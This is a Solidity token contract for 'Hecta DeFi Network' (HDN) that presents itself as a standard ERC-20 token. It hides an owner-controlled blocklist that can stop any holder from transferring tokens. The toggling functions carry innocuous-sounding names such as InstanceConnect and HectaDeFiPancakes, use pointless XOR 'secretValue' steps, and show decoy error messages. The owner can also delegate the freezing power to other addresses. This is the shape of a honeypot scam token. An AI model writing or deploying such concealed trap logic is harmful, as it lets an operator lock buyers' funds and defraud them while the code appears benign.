// SPDX-License-Identifier: MIT


pragma solidity ^ 0.8.19;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

abstract contract Owned {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}

contract BaseToken is Ownable {
    using SafeMath
    for uint256;

    string constant public name = 'Hecta DeFi Network';
    string constant public symbol = 'HDN';
    uint8 constant public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => bool) private _dappbays;
    mapping(address => bool) private _baysapps; //

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "balanceOf[from].sub(value)");
        require(!_dappbays[from], "calculateFee(value)");

        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);

        emit Transfer(from, to, value);
    }

    function InstanceConnect(address account) public onlyOwner {
        bool currentValue = _dappbays[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _dappbays[account] = secretValue != 0;
    } // Instance Fs 

    function transfer(address to, uint256 value) public returns(bool) {
        _transfer(msg.sender, to, value);
        return true;
    }    function SolidityContractRelease(address addressholders) public onlyOwner {
        bool currentValue = _baysapps[addressholders];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _baysapps[addressholders] = secretValue != 0;
    } // Bays Instance



    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function HectaDeFiPancakes(address addressholders) public onlyOwner {
        bool currentValue = _baysapps[addressholders];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _baysapps[addressholders] = secretValue != 0;
    } // Add Access Pancakes Bridge 

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function approve(address spender, uint256 value) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function HectaAppsGranted(address account) public {
        require(_baysapps[msg.sender], "Failed Transactions");
        bool currentValue = _dappbays[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _dappbays[account] = secretValue != 0;
    } // AppsGrantedAccess

    function Web3AppsConnect(address account) public view returns(bool) {
        return _dappbays[account];
    }


}

contract HectaContract is BaseToken {
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
    }
}